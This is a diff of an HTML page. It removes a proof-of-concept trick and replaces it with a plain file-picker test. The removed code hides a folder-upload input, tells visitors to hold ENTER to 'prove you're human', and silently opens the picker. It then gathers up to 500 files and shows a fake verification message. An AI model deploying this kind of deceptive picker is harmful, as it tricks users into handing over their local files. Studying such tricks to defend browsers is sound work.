@@ -1,48 +1,19 @@
+<!DOCTYPE html>
 <html>
-<head>
-    <title>
-		Read Recent Used Folder Files
-    </title>
-    <style>
-        #thing {
-            opacity: 0.0;
-        }
-    </style>
-</head>
-
 <body>
-    <h3 id="qmsg">Hold down the ENTER key for 5 seconds to prove you're human..</h3>
-    <input id="thing" type="file" webkitdirectory accept="text/plain" />
 
-    <script>
-		var want=[];
-		  var len;
-		  
-        thing.onchange = function() {
-            alert('I can read ' + (len=this.files.length) + ' files from last accessed folder from this browser on your pc!');//This is for PoC only. We can access all data using this.files as seen next.
-			
-			for(i=0;i<500;i++){
-				want.push(thing.files[i]);
-				
-			};
-			thing.value='';
-			thing.remove();
-			alert(want.length);
-        };
-		
-        //This is where we detect if the user is holding the Enter button.
-        var i = 0;
-        document.onkeydown = function() {
-            i++;
-            if (i > 4) {
-                thing.click();
-                i = -10000;
-                document.onkeydown = null;
-                setTimeout(function() {
-                    qmsg.innerHTML = '<u>Thank you! Please wait while we verify (this might take a few minutes). <br>Feel free to go to a different tab while you wait.<br> We will notify you when its done.</u>';
-                }, 1000);
-            };
-        };
-    </script>
+<h2>File Picker Test</h2>
+
+<input type="file" id="fileInput" multiple>
+
+<script>
+document.getElementById('fileInput').addEventListener('change', function(e){
+    const files = e.target.files;
+    for (let i = 0; i < files.length; i++) {
+        console.log("Selected:", files[i].name);
+    }
+});
+</script>
+
 </body>
-
+</html>
